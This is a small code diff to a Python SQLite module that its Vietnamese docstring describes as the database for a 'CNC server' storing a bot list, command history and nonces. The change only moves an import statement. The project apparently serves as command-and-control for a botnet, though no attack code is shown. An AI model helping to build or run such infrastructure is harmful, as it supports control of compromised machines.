@@ -4,6 +4,7 @@ SQLite database cho CNC server — lưu bot list, command history, nonces.
 Dùng aiosqlite để không block asyncio event loop.
 """
 
+import json
 import logging
 import time
 from pathlib import Path
@@ -160,6 +161,3 @@ class Database:
         cutoff = time.time() - max_age
         await self._conn.execute("DELETE FROM nonces WHERE used_at < ?", (cutoff,))
         await self._conn.commit()
-
-
-import json
